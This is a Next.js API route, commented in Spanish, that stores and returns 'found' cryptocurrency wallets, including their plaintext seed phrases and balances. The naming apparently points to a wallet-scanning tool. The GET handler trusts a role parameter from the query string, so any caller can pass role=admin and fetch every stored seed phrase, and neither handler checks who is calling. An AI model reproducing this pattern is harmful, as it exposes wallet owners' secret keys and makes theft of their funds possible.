import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';

// GET /api/wallets - fetch found wallets
export async function GET(req: NextRequest) {
  try {
    const userId = req.nextUrl.searchParams.get('userId') || 'public';
    const role = req.nextUrl.searchParams.get('role') || 'user';

    let query = supabaseAdmin
      .from('wallet_results')
      .select('*')
      .order('found_at', { ascending: false })
      .limit(500);

    // Si no es admin, devolver únicamente las wallets encontradas por este usuario
    if (role !== 'admin') {
      query = query.eq('user_id', userId);
    }

    const { data, error } = await query;
    if (error) throw error;

    return NextResponse.json({ data: data || [] });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : 'Database error';
    console.warn('GET /api/wallets warning:', msg);
    return NextResponse.json({ data: [], warning: 'Error al consultar wallets' });
  }
}

// POST /api/wallets - save found wallet
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const {
      user_id, user_email, phrase,
      eth_address, eth_balance,
      bsc_address, bsc_balance,
      btc_address, btc_balance,
      sol_address, sol_balance
    } = body;

    if (!phrase) {
      return NextResponse.json({ error: 'Missing phrase' }, { status: 400 });
    }

    const insertData = {
      user_id: user_id || 'public',
      user_email: user_email || 'anónimo',
      phrase,
      eth_address: eth_address || null, eth_balance: eth_balance || 0,
      bsc_address: bsc_address || eth_address || null, bsc_balance: bsc_balance || 0,
      btc_address: btc_address || null, btc_balance: btc_balance || 0,
      sol_address: sol_address || null, sol_balance: sol_balance || 0,
    };

    const { data, error } = await supabaseAdmin
      .from('wallet_results')
      .insert([insertData])
      .select()
      .single();

    if (error) throw error;

    return NextResponse.json({ success: true, data });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : 'Database error';
    return NextResponse.json({ error: msg }, { status: 500 });
  }
}
